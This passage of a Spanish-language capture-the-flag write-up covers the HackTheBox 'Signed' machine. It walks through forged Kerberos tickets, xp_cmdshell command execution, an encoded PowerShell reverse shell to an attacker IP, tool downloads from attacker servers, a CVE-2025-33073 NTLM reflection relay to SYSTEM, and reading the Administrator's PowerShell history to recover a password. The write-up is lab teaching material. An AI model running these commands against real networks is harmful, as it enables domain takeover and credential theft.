[*] Encryption required, switching to TLS
[+] Using Kerberos Cache: mssqlsvc.ccache
[+] Domain retrieved from CCache: SIGNED.HTB
[+] Returning cached credential for MSSQLSVC/DC01.SIGNED.HTB:1433@SIGNED.HTB
[+] Using TGS from cache
[+] Username retrieved from CCache: mssqlsvc
[+] Computed tls-unique CBT token: 8c911074c96886606e81cc2ba902390a
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (SIGNED\mssqlsvc  dbo@master)> 
```

> Nota que cuando nos conectamos con el ticket falso, ya notaremos que `mssql` nos asigna a `dbo` (`Database Owner`). La cual es una cuenta especial dentro de `mssql` con privilegios elevados.
{: .notice--warning}

Una vez dentro de la instancia de `mssql`, comprobaremos privilegios `sysadmin` con el siguiente query usando las funciones  `IS_SRVROLEMEMBER()` y `fn_my_permissions()`. Los permisos muestran control absoluto sobre el servicio `SQL Server`

``` bash
SQL (SIGNED\mssqlsvc  dbo@master)> SELECT IS_SRVROLEMEMBER('sysadmin')
    
-   
1 

SQL (SIGNED\mssqlsvc  dbo@master)> SELECT * FROM fn_my_permissions(NULL, 'SERVER')

entity_name   subentity_name   permission_name                                 
-----------   --------------   ---------------------------------------------   
server                         CONNECT SQL                                     
server                         SHUTDOWN                                        
server                         CREATE ENDPOINT                                 
server                         CREATE ANY DATABASE                             
server                         CREATE AVAILABILITY GROUP                       
server                         CREATE LOGIN                                    
server                         ALTER ANY LOGIN                                 
server                         ALTER ANY CREDENTIAL                            
server                         ALTER ANY ENDPOINT                              
server                         ALTER ANY LINKED SERVER                         
server                         ALTER ANY CONNECTION                            
server                         ALTER ANY DATABASE

...
<SNIP>
...
```


## Abusing `xp_cmdshell` to RCE

Como ya tenemos privilegios dentro de `mssql`, podremos habilitar el procedimiento almacenado `xp_cmdshell`, ya sea de forma nativa o con el comando de la herramienta `mssqlclient`

``` bash
SQL (SIGNED\mssqlsvc  dbo@master)> enable_xp_cmdshell
INFO(DC01): Line 196: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
INFO(DC01): Line 196: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (SIGNED\mssqlsvc  dbo@master)> xp_cmdshell whoami
output            
---------------   
signed\mssqlsvc   

NULL              
```

En este punto ya podemos ejecutar comandos en el Controlador de Dominio a través de`mssql`


## Shell as `mssqlsvc`

Enviaremos una consola a nuestra IP por un puerto, podemos utilizar un payload desde [`revshells.com`](https://www.revshells.com/) que ejecute un comando en `base64` por ejemplo.

> Antes de ejecutar una `reverse shell` desde `SQL Server`, iniciaremos un listener con `rlwrap` y `netcat` para recibir la conexión.
{: .notice--danger}

``` bash
rlwrap -cAr nc -lvnp 443
```

Ejecutaremos el comando de `powershell` que debería entablar una conexión hacia nuestro listener más o menos de la siguiente manera

``` bash
SQL (SIGNED\mssqlsvc  dbo@master)> xp_cmdshell powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANQA0ACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
```

Desde nuestro listener recibiremos una consola de `powershell` como el usuario `mssqlsvc`

``` bash
rlwrap nc -lvnp 443
Connection from 10.129.242.173:64034

PS C:\Windows\system32> whoami
signed\mssqlsvc
```

Ya podremos ver la flag ubicada en el escritorio del usuario `mssqlsvc`

``` bash
PS C:\Windows\system32> dir C:\Users

    Directory: C:\Users

Mode                LastWriteTime         Length Name
----                -------------         ------ ----             
d-----        10/7/2025   2:56 AM                Administrator
d-----        10/2/2025   9:27 AM                mssqlsvc
d-r---        4/10/2020  10:49 AM                Public                                                                
PS C:\Windows\system32> type C:\Users\mssqlsvc\Desktop\user.txt
3c3...
```
<br>


# Escalada de Privilegios
---
## CVE-2025-33073 - Windows `SMB` Client Privilege Escalation

[CVE-2025-33073](https://nvd.nist.gov/vuln/detail/CVE-2025-33073) es una vulnerabilidad de elevación de privilegios en el cliente `SMB` de Windows, la cual está catalogada como [`Improper Access Control`](https://cwe.mitre.org/data/definitions/284.html). 

Permite un atacante obtener privilegios elevados eludiendo las protecciones contra `NTLM Reflection` al procesar solicitudes de autenticación `NTLM` locales falsas

### Understanding Attack

> `NTLM Reflection` (o reflexión `NTLM`) es un caso especial de retransmisión `NTLM` (`NTLM Relay`) en el que la autenticación original se transmite de vuelta al equipo desde el que se originó la autenticación ([`Synacktiv`](https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025)).
{: .notice--info}

Windows utiliza la comparación de nombres de host para determinar si la autenticación `NTLM` es local. 

Si incluye que el destino es el mismo, activa el modo `NTLM` local, que omite la verificación `challenge-response` e inserta el token directamente en la memoria.

Esta lógica se rompe cuando se utilizan nombres `DNS` creados que incluyen metadatos ordenados (`marshalled metadata`), donde por ejemplo un atacante puede utilizar un nombre de host como el siguiente

``` bash
localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
```

Windows analiza la cadena `DNS`, elimina los metadatos y compara solo el nombre de host, interpretando que la conexión es local (desde `localhost`), recomiendo el post de [`Synacktiv`](https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025) para una mayor compresión.

Para acceso privilegiado, los procesos `SYSTEM` como `lsass.exe` pueden ser obligados a autenticarse en un listener controlado a través de técnicas como [`PetitPotam`](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/ms-efsr), utilizando credenciales de una cuenta de bajos privilegios.

Finalmente, capturamos esa autenticación forzada (`Coerced Authentication`) y la retransmitimos de vuelta, obteniendo acceso con privilegios de `SYSTEM`

### Port Forwarding

Como no tenemos conexión directa con todos los servicios del Controlador de Dominio, una buena opción es hacer un reenvío de puertos dinámico para poder acceder a estos servicios del dominio a través de un túnel.

> En mi caso he utilizado [`chisel`](https://github.com/jpillora/chisel), aunque perfectamente puedes utilizar herramientas como [`ligolo-ng`](https://github.com/nicocha30/ligolo-ng). 
{: .notice--warning}

Iniciaremos `chisel` en modo servidor por un puerto (en mi caso el `8000`)

``` bash
chisel server -p 8000 --reverse
2026/02/12 00:09:28 server: Reverse tunnelling enabled
2026/02/12 00:09:28 server: Fingerprint 2T5gyrqhVqv7OJ3ICUcqhJl/q+iWV1blZkc2/psfAMo=
2026/02/12 00:09:28 server: Listening on http://0.0.0.0:8000
```

Aprovechando la shell que tenemos disponible desde la máquina víctima podemos descargarnos el binario compilado para Windows con herramientas nativas, como `certutil` o `Invoke-WebRequest`.

> Iniciaremos un servidor `HTTP` con `python3` para poder servir `chisel.exe`: `python3 -m http.server 80 --bind 0.0.0.0`.
{: .notice--warning}

``` bash
PS C:\Programdata> IWR -uri http://10.10.14.3/chisel.exe -outfile chisel.exe
```

Una vez el binario de `chisel` esté subido en el DC, lo ejecutaremos en modo cliente para establecer un túnel `SOCKS` hacia nuestro servidor por el puerto `8000`

``` bash
PS C:\Programdata> .\chisel.exe client 10.10.14.3:8000 R:socks
```

En nuestro servidor `chisel` veremos cómo se abre un nuevo túnel por el puerto `1080`

``` bash
2026/02/12 01:36:24 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

Por último configuramos `proxychains` para hacer uso el túnel a través de esta herramienta

``` bash
sed -i 's/^dynamic_chain/#dynamic_chain/' /etc/proxychains.conf # Disable dynamic chain
sed -i 's/^#strict_chain/strict_chain/' /etc/proxychains.conf # Enable strick chain
echo 'socks5 127.0.0.1 1080' | tee -a /usr/local/etc/proxychains.conf # Set the tunnel
socks5 127.0.0.1 1080


# Verify
cat /etc/proxychains.conf | grep -E "strict_chain|dynamic_chain|socks"

#dynamic_chain
strict_chain
#            	socks5	192.168.67.78	1080	lamer	secret
#		socks4	192.168.1.49	1080
#       proxy types: http, socks4, socks5, raw
#        ( auth types supported: "basic"-http  "user/pass"-socks )
socks5	127.0.0.1   1080
```

Validaremos la conexión hacia el Controlador de Dominio intentando autenticarnos en un servicio común, (por ejemplo `SMB`)

``` bash
proxychains4 -q nxc smb DC01.signed.htb -u mssqlsvc -p 'purPLE9795!@'
SMB         224.0.0.1       445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:SIGNED.HTB) (signing:True) (SMBv1:False)
SMB         224.0.0.1       445    DC01             [+] SIGNED.HTB\mssqlsvc:purPLE9795!@
```

### Exploiting

Para comenzar el ataque, necesitamos añadir un nuevo registro `DNS`, en este caso el hostname`localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA` malformado causará la autenticación local `NTLM`, aunque realmente hace referencia a nuestra dirección IP

``` bash
proxychains4 dnstool.py -u 'signed.htb\mssqlsvc' -p 'purPLE9795!@' -a add -r 'localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA' -d 10.10.14.3 10.129.242.173
          
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/libproxychains4.so
[proxychains] DLL init: proxychains-ng 
[-] Connecting to host...
[-] Binding to host
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.242.173:389  ...  OK
[+] Bind OK
[-] Adding extra record
[+] LDAP operation completed successfully
```

### Trigger

Antes de activar el ataque, iniciaremos un listener con `ntlmrelayx` para redirigir la autenticación entrante de vuelta al `DC`.

> Debido a problemas con `ntlmrelayx`, considera utilizar la última versión disponible desde el repositorio de `impacket` en [`Github`](https://github.com/fortra/impacket).
{: .notice--danger}

``` bash
git clone https://github.com/fortra/impacket && cd impacket
uv venv                            
source .venv/bin/activate
uv pip install .

proxychains4 -q uv run ntlmrelayx.py -t winrms://DC01.signed.htb -smb2support -i
Impacket v0.14.0.dev0+20260209.180151.8cb82c0f - Copyright Fortra, LLC and its affiliated companies 

[*] Protocol Client WINRMS loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client SMTP loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Setting up WinRM (HTTP) Server on port 5985
[*] Setting up WinRMS (HTTPS) Server on port 5986
[*] Setting up RPC Server on port 135
[*] Setting up MSSQL Server on port 1433
[*] Setting up RDP Server on port 3389
[*] Multirelay disabled

[*] Servers started, waiting for connections
```

Lanzaremos el ataque utilizando ya sea el módulo `coerce_plus` de `netexec` o bien la herramienta `PetitPotam`, donde obligamos al Controlador de Dominio a conectarse al registro `DNS` malicioso

``` bash
proxychains4 petitpotam.py -d signed.htb -u 'mssqlsvc' -p 'purPLE9795!@' localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA DC01.signed.htb

[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/libproxychains4.so
[proxychains] DLL init: proxychains-ng 

                                                                                               
              ___            _        _      _        ___            _                     
             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __   
             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \  
            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_| 
          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""| 
          "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
                                         
              PoC to elicit machine account authentication via some MS-EFSRPC functions
                                      by topotam (@topotam77)
      
                     Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN



Trying pipe lsarpc
[-] Connecting to ncacn_np:DC01.signed.htb[\PIPE\lsarpc]
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  DC01.signed.htb:445  ...  OK
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
[+] OK! Using unpatched function!
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
```

Desde nuestro listener, recibiremos la autenticación `NTLM`. Para saber que el ataque tuvo éxito, veremos el mensaje `SUCCEED`, además de uno sobre una shell interactiva que se ha iniciado por el puerto `11001` en nuestra máquina

``` bash
[*] Servers started, waiting for connections
[*] (SMB): Received connection from 127.0.0.1, attacking target winrms://DC01.signed.htb
[!] The client requested signing, relaying to WinRMS might not work!
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01.signed.htb:5986  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01.signed.htb:5986  ...  OK
[*] HTTP server returned error code 500, this is expected, treating as a successful login
[*] (SMB): Authenticating connection from /@127.0.0.1 against winrms://DC01.signed.htb SUCCEED [1]
[*] winrms:///@dc01.signed.htb [1] -> Started interactive WinRMS shell via TCP on 127.0.0.1:11000
[*] (SMB): Received connection from 127.0.0.1, attacking target winrms://DC01.signed.htb
[!] The client requested signing, relaying to WinRMS might not work!
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01.signed.htb:5986  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01.signed.htb:5986  ...  OK
[*] HTTP server returned error code 500, this is expected, treating as a successful login
[*] (SMB): Authenticating connection from /@127.0.0.1 against winrms://DC01.signed.htb SUCCEED [2]
[*] winrms:///@dc01.signed.htb [2] -> Started interactive WinRMS shell via TCP on 127.0.0.1:11001
```

Para acceder a la interfaz `WinRMS`, nos conectaremos con `netcat` hacia nuestro puerto `11001`

``` bash
nc 127.0.0.1 11001

# whoami
nt authority\system

# type C:\Users\Administrator\Desktop\root.txt 
d05...
```
<br>


# Unintended Privilege Escalations
---
## File Read via `OPENROWSET(BULK)` - MSSQL

> `OPENROWSET` es una función `T-SQL` en `SQL Server` que permite acceder a datos remotos o externos (como archivos `CSV`, `Parquet`, `JSON`, o bases de datos `OLE DB`) sin necesidad de importarlos previamente.
{: .notice--info}

En SQL Server, la función `OPENROWSET` con la opción `BULK` se utiliza para leer datos de un archivo y devolverlos como un conjunto de filas, lo que permite consultar archivos externos como si fueran una tabla.

Por ejemplo, podemos utilizar la función `openrowset` de forma que intentemos ver el contenido de un archivo, como `hosts`

``` sql
SELECT * from OEPNROWSET(BULK 'C:\Windows\System32\drivers\etc\hosts', single_clob) as Content;
```

### Silver Ticket

Cuando creamos un `Silver Ticket`, podemos especificar membresías de grupo (incluso `Domain Admins`), solo debemos considerar que los privilegios aplicarán solamente a nivel de servicio en `SQL Server`.

Para añadir la membresía de un grupo con privilegios de `Domain Admins`, buscaremos su `SID` dentro de `mssql` usando la función `SUSER_SID()`.

> Aunque parezca tedioso porque el `RID` de este grupo es estándar, solamente estamos poniendo en práctica la técnica que aprendimos para convertir el valor del `RID`.
{: .notice--warning}

``` bash
SQL (SIGNED\mssqlsvc  dbo@master)> SELECT SUSER_SID('SIGNED\Domain Admins');
                                                              
-----------------------------------------------------------   
b'0105000000000005150000005b7bb0f398aa2245ad4a1ca400020000'
```

Si hacemos la conversión manual (sin buscar en internet) comprobaremos que el `RID` del grupo `Domain Admins` es `512`

``` bash
# Last 4 bytes: 00 02 00 00 -> little-endian -> 00 00 02 00
echo "$((0x00000200))"                                                 
512
```

También podemos usar la librería de `impacket` para obtener el `SID` de una forma más sencilla con `python`

``` bash
python3

Python 3.13.9 (main, Nov  9 2025, 07:22:55) [Clang 15.0.0 (clang-1500.3.9.4)] on darwin
Type "help", "copyright", "credits" or "license" for more information.

>>> from impacket.dcerpc.v5.dtypes import SID
>>> raw = '0105000000000005150000005b7bb0f398aa2245ad4a1ca400020000'
>>> SID(bytes.fromhex(raw)).formatCanonical()
'S-1-5-21-4088429403-1159899800-2753317549-512'
>>> exit()
```

Crearemos un ticket de servicio agregando al grupo `Domain Admins` dentro del parámetro `-groups`

``` bash
export NT_HASH=$(printf '%s' 'purPLE9795!@'| iconv -t utf16le | openssl md4 | awk '{print $NF}')

ticketer.py -domain signed.htb -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -spn mssqlsvc/dc01.signed.htb:1433 -groups 512,1105 -user-id 1103 -nthash "$NT_HASH" mssqlsvc
Impacket v0.13.0.dev0+20250717.182627.84ebce48 - Copyright Fortra, LLC and its affiliated companies 

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for signed.htb/mssqlsvc
[*] 	PAC_LOGON_INFO
[*] 	PAC_CLIENT_INFO_TYPE
[*] 	EncTicketPart
[*] 	EncTGSRepPart
[*] Signing/Encrypting final ticket
[*] 	PAC_SERVER_CHECKSUM
[*] 	PAC_PRIVSVR_CHECKSUM
[*] 	EncTicketPart
[*] 	EncTGSRepPart
[*] Saving ticket in mssqlsvc.ccache
```

- `-groups 512,1105`: Grupos `Domain Admins e IT`.

### MSSQL Access

Con el nuevo ticket creado, nos conectaremos al servicio `mssql`. donde de primeras no vemos mayores cambios ya que aún nuestro usuario se mapea hacia la cuenta `dbo`

``` bash
KRB5CCNAME=mssqlsvc.ccache mssqlclient.py -k -no-pass DC01.signed.htb -debug
 
Impacket v0.13.0.dev0+20250717.182627.84ebce48 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /root/.local/share/pipx/venvs/impacket/lib/python3.11/site-packages/impacket
[*] Encryption required, switching to TLS
[+] Using Kerberos Cache: mssqlsvc.ccache
[+] Domain retrieved from CCache: SIGNED.HTB
[+] Returning cached credential for MSSQLSVC/DC01.SIGNED.HTB:1433@SIGNED.HTB
[+] Using TGS from cache
[+] Username retrieved from CCache: mssqlsvc
[+] Computed tls-unique CBT token: 39b517ccbfdcf4b5ce2406cf6b3fbd64
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (SIGNED\mssqlsvc  dbo@master)> 
```

### File Read

Como tenemos privilegios máximos dentro del servicio `mssql`, podremos ver tanto la flag de `user` (que se encuentra en el escritorio de la cuenta `mssqlsvc`)

``` bash
SQL (SIGNED\mssqlsvc  dbo@master)> select * from openrowset(bulk 'C:\Users\mssqlsvc\Desktop\user.txt', single_clob) as x
BulkColumn                                
---------------------------------------   
b'ecd2ae96efa8320b6902084391e44526\r\n'
```

Como también ahora podremos ver la flag de `system`, ubicada en el escritorio del usuario `Administrator`

``` bash
SQL (SIGNED\mssqlsvc  dbo@master)> select * from openrowset(bulk 'C:\Users\Administrator\Desktop\root.txt', single_clob) as file_content
BulkColumn                                
---------------------------------------   
b'1b972d16a5ba792bc109ab889202f28c\r\n' 
```


## Credentials Leakage - `Powershell` History

Otra forma interesante de escalar privilegios es mirando el historial de `powershell` del usuario `Administrator`, el cual en este caso contiene información sensible.

Aprovecharemos la función `OPENROWSET()` usando la opción `BULK` para leer este archivo (el cual requiere privilegios al ser `Administrator`).

> Podemos facilitar la lectura al hacer la query desde `netexec`, donde usamos el parámetro `--query` para ejecutar una consulta de `SQL Server`
{: .notice--warning}

``` bash
KRB5CCNAME=mssqlsvc.ccache nxc mssql DC01.signed.htb -k --use-kcache --query "select * from openrowset(bulk 'C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt', single_clob) as x"
```

Dentro de toda la salida del comando, veremos uno que asigna credenciales para el usuario `Administrator` en texto claro

![image-center](/assets/images/posts/signed-1-hackthebox.png)
{: .align-center}

### `WinRMS` via Proxy

Ahora tenemos dos alternativas para establecer una shell como `Administrator`, ya sea aprovechando el túnel con `chisel` que creamos anteriormente (si es que aún lo tienes activo) para conectarnos por el servicio `WinRM` o `WinRMS`

Mediante una enumeración de puertos internos podremos comprobar que el servicio activo es `WinRMS` (puerto `5986`)

``` bash
PS C:\Programdata> netstat -ano | findstr LISTEN
```

![image-center](/assets/images/posts/signed-2-hackthebox.png)
{: .align-center}

Simplemente nos conectaremos vía `evil-winrm-py` usando la herramienta `proxychains` (que la configuramos previamente durante la escalada intencionada)

``` bash
proxychains4 -q evil-winrm-py -i DC01.signed.htb -u Administrator -p 'Th1s889Rabb!t' --ssl
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.5.0

[*] Connecting to 'DC01.signed.htb:5986' as 'Administrator'
evil-winrm-py PS C:\Users\Administrator\Documents> whoami
signed\administrator
```

### RunasCs

La otra opción viable es usar la herramienta `RunasCs.exe` para lanzar una nueva shell o ejecutar comandos como administrator.

> Primeramente descargaremos la herramienta en el `DC`, iniciaremos un servidor con `python` con el comando: `python3 -m http.server 80 --bind 0.0.0.0`.
{: .notice--warning}

``` bash
PS C:\Programdata> curl http://10.10.14.54/RunasCs.exe -o RunasCs.exe
```

Ya podremos ejecutar un comando como `Administrator` a través de esta herramienta

``` bash
PS C:\Programdata> .\RunasCs.exe Administrator 'Th1s889Rabb!t' whoami

signed\administrator
```

### Root Time

Lanzaremos una nueva reverse shell utilizando las credenciales de `Administrator`

> Recordemos iniciar un listener con `netcat` por un puerto: `rlwrap -cAr nc -lvnp 443`.
{: .notice--warning}

``` bash
PS C:\Programdata> .\RunasCs.exe Administrator 'Th1s889Rabb!t' powershell.exe -r 10.10.16.29:443

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-6b727$\Default
[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 4276 created in background.
```

En nuestro listener recibiremos la conexión como `Administrator`

``` bash
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
whoami
signed\administrator
```

Ya podremos ver la última flag del sistema ubicada en el escritorio del usuario `Administrator`

``` bash
PS C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
type C:\Users\Administrator\Desktop\root.txt
1b9...
```

Gracias por leer, a continuación te dejo la cita del día.

> The greatest barrier to success is the fear of failure.
> — Eriksson
{: .notice--info}
